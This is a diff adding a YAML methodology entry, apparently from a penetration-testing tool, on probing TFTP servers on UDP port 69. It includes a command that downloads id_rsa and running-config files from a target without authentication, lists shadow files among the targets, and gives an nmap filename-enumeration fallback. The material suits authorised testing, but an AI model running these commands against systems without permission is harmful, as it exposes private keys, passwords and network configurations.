@@ -1,0 +1,27 @@
+id: tftp
+name: TFTP Trivial File Transfer Protocol (Port 69 UDP)
+category: network
+description: Methodology for TFTP on UDP port 69. Covers unauthenticated file downloads, network configuration extraction, and blind file probing.
+port_triggers:
+  - 69
+service_triggers:
+  - tftp
+tags:
+  - tftp
+  - udp
+  - file-transfer
+  - recon
+steps:
+  - id: tftp-enum-files
+    title: TFTP File Discovery & Download
+    phase: enumeration
+    purpose: TFTP has no directory listing capability; probe and download known filenames (id_rsa, config, running-config, shadow).
+    command: tftp {{TARGET}} -c get id_rsa && tftp {{TARGET}} -c get running-config.cfg
+    expected_output:
+      - Received 2602 bytes in 0.1 seconds
+    common_mistakes:
+      - TFTP runs on UDP; ensure your firewall allows outbound UDP traffic.
+    if_success: Files downloaded! Inspect configs, passwords, and private SSH keys.
+    if_failure: File not found. Try wordlist fuzzing for filenames with `nmap -sU -p 69 --script tftp-enum {{TARGET}}`.
+    references:
+      - https://book.hacktricks.xyz/network-services-pentesting/69-udp-tftp
